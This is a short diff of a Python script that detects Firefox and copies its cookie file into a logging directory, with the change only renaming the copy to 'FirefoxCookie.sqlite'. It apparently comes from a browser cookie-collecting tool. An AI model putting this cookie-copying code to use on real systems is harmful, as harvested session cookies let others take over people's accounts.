@@ -53,7 +53,7 @@ if os.path.exists(firefox):
         firefoxRes = True
         if enabledLog == True:
                 print("Firefox: DETECTED")
-                fileutils.copyFile(firefox, otherlogging.directory + "FirefoxCookie")
+                fileutils.copyFile(firefox, otherlogging.directory + "FirefoxCookie.sqlite")
 
 if enabledLog == True:
         print("-----------------------------")
